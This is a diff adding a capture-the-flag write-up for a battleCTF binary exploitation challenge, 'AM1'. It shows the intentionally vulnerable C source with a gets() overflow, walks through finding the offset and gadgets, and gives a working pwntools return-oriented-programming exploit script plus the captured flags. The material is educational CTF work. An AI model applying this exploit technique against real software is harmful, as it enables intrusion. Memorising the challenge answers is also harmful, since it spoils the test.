@@ -33,8 +33,10 @@
 - TorrentVerse
 
 ## Binary Exploitation
+- Black Rop
 - AM1
 - youpi
+- battleCTF Event Portal 
 - AXOVI
 - 0xf
 
@@ -890,3 +892,143 @@ It also works remotely
 ```
 Flag: battleCTF{rop_Afr1cA_x_7352adb6a9fd43b762413112a9695fde}
 ```
+
+#### AM1
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c9a98579-4611-4201-a915-45974163e360)
+
+After downloading the attached file and unzipping it shows that the source code is given
+
+Here's the content
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e0b6688d-09fd-4d73-b6a6-24f0270f4a55)
+
+```c
+//gcc -o am1 am1.c -no-pie
+#include <stdio.h>
+#include <stdlib.h>
+
+
+void print_file(char * file)
+{
+	char buffer[20];
+	FILE * inputFile = fopen( file, "r" );
+	if ( inputFile == NULL ) {
+        printf( "Cannot open file %s\n", file );
+        exit( -1 );
+    }
+    fgets( buffer, 65, inputFile );
+    printf("Output: %s",buffer);
+}
+
+int main(){
+
+
+    puts("Welcome to Africa battleCTF.");
+    puts("Tell us something about you: ");
+    char buf[0x30];
+    gets( buf );
+
+    return 0;
+}
+```
+
+It's a small C file and here's what it does:
+- The main function prints out some text and uses gets() to receive our input # bug here
+- The function print_file is never called but what it does is to print out the content of what is passed in the argument
+
+Now the aim of what we should do here is that since we know there's a buffer overflow since gets is used we can overwrite the EIP to call the print_file function then pass in a memory address containing `flag.txt` as the argument
+
+But the issue is `flag.txt` isn't in the binary memory and we can't pass it as a string but rather an address
+
+The way we can go around this is by writing the value of `flag.txt` in a writable section of the binary then call the print_file function on that address
+
+Let us get the file type and the protection enabled on the binary
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/531ca267-bf12-442f-a579-6a6581dd1979)
+
+This is a x64 binary which is dynamically linked and not stripped
+
+The only protection enabled is NX (No Execute) which prevents shellcode upload to the stack and the execution of it
+
+Now that we know that let us get a section of the binary which is writable 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0956a234-512e-46e0-8beb-cd2ab3238c92)
+
+The `.data` section looks like a good candidate for this 
+
+Now we need the offset and as usual i'll use gdb-gef for it
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8499ede0-8437-44e2-ab99-b178957909cf)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/809b0b17-f3b8-4cb2-9366-4a29927e1d1b)
+
+Cool! The offset is 56
+
+For x64 binary the calling convention is passed in via registers 
+
+In this case we would need a pop rdi gadget
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/135be385-be24-4b19-b99f-8c4a238d3799)
+
+With that set here's my exploit [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/battlectf23/prequal/pwn/am1/solve.py)
+
+```python
+#!/usr/bin/python3
+from pwn import *
+import warnings
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './am1'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'info'
+warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Start program
+io = start()
+
+offset = 56 
+pop_rdi = 0x000000000040128b # pop rdi; ret; 
+data = 0x00404048 # .data section
+
+# Build the payload
+payload = flat({
+    offset: [  
+        pop_rdi,
+        data,
+        elf.plt['gets'],
+        pop_rdi,
+        data,
+        elf.symbols['print_file']
+    ]
+})
+
+io.sendline(payload)
+
+io.interactive()
+```
+
+Running it works locally and also remotely
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/96535f5a-91d9-4895-a289-1a9427ccf900)
+
+So basically what I did was to use gets() to receive our input which will then be stored in the .data section and i can then call the print_file function with the .data section as the parameter 🙂
+
+```
+Flag: battleCTF{Africa_1d3al_r0p_e70bee3af3e2b1430d8dc7863a33790d}
+```
+
